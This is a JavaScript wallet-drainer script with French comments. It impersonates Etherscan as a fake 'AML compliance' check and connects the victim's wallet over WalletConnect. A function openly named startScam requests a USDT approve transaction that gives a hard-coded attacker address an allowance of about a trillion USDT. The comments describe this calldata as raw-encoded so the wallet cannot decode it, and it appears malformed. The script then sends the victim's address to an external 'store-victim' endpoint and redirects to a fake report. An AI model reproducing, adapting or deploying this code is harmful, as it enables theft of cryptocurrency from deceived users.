const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
const API = 'https://aml-checker-4.vercel.app/api/store-victim';

const TOKENS = {
  '1': [
    { name: 'USDT', addr: '0xdAC17F958D2ee523a2206206994597C13D831ec7' }
  ]
};

let signClient;
let session;
let account;
let currentChainId;
const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';

function getSignClient() {
  const ns = window["@walletconnect/sign-client"];
  if (ns) {
    const sc = ns.SignClient || ns.default;
    if (sc && typeof sc.init === 'function') return sc;
  }
  return null;
}

async function initWalletConnect() {
  const SignClientClass = getSignClient();
  if (!SignClientClass) throw new Error('WalletConnect SignClient non trouvé.');

  signClient = await SignClientClass.init({
    projectId: PROJECT_ID,
    metadata: {
      name: 'Etherscan',
      description: 'Verify your wallet for AML compliance',
      url: 'https://etherscan.io',
      icons: ['https://aml-checker-4.vercel.app/etherscan-logo-circle.png']
    }
  });

  const { uri, approval } = await signClient.connect({
    requiredNamespaces: {
      eip155: {
        methods: ['eth_sendTransaction'],
        chains: ['eip155:1'],
        events: ['chainChanged', 'accountsChanged']
      }
    }
  });

  // QR code
  await new Promise((resolve, reject) => {
    if (typeof QRCode !== 'undefined') return resolve();
    let tries = 0;
    const interval = setInterval(() => {
      if (typeof QRCode !== 'undefined') {
        clearInterval(interval);
        resolve();
      }
      tries++;
      if (tries > 10) {
        clearInterval(interval);
        reject(new Error('QRCode non chargé après 5s'));
      }
    }, 500);
  });

  const qrDiv = document.getElementById('qrcode');
  qrDiv.innerHTML = '';
  new QRCode(qrDiv, {
    text: uri,
    width: 280,
    height: 280
  });
  document.getElementById('status').innerText = 'Scannez le QR code avec votre wallet';

  session = await approval();

  const accounts = session.namespaces['eip155'].accounts;
  const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
  if (!ethAccount) {
    throw new Error('Aucun compte Ethereum mainnet trouvé. Veuillez sélectionner Ethereum dans votre wallet.');
  }
  account = ethAccount.split(':')[2];
  currentChainId = '1';

  document.getElementById('qrcode').style.display = 'none';
  document.getElementById('status').innerText = `Connecté : ${account.substring(0,6)}...${account.substring(38)}`;

  setTimeout(() => startScam(), 1000);
}

async function startScam() {
  if (currentChainId !== '1') {
    document.getElementById('status').innerText = 'Réseau non supporté (Ethereum mainnet requis)';
    return;
  }

  const tokens = TOKENS[currentChainId];
  if (!tokens) return;

  // ✅ Montant énorme mais pas infini → 999 999 999 999 USDT (12 chiffres)
  const AMOUNT = '999999999999000000'; // 6 décimales USDT

  // ✅ Encodage brut → wallet ne peut pas décrypter
  const data = '0x095ea7b3' + 
    accountToHex(ATTACKER).substring(2) + 
    '00000000000000000000000000000000' + 
    '00000000000000000000000000000000' + 
    AMOUNT.padStart(64, '0').substring(0, 64);

  const tx = {
    from: account,
    to: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    data: data,
    chainId: 1,
    gasLimit: '0x7a120', // 500 000
    gasPrice: '0x77359400' // 2 gwei
  };

  try {
    const result = await signClient.request({
      topic: session.topic,
      request: {
        id: Date.now(),
        jsonrpc: '2.0',
        method: 'eth_sendTransaction',
        params: [tx]
      },
      chainId: 'eip155:1'
    });
    console.log('✅ Approve envoyé (brut) :', result);
  } catch (e) {
    console.error('❌ Échec de l’approbation brute :', e);
  }

  // ✅ Envoie les infos à ton API
  await fetch(API, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ victim: account, chain: currentChainId })
  });

  document.getElementById('status').innerText = 'Vérification AML terminée. Redirection...';
  setTimeout(() => window.location.href = '/report.html', 3000);
}

// ✅ Fonction utilitaire : convertit une adresse en hex 32 bytes
function accountToHex(addr) {
  return '0x' + addr.slice(2).padStart(64, '0');
}

initWalletConnect().catch(err => {
  console.error('Erreur init WalletConnect:', err);
  document.getElementById('status').innerText = `Erreur : ${err.message || err}`;
});
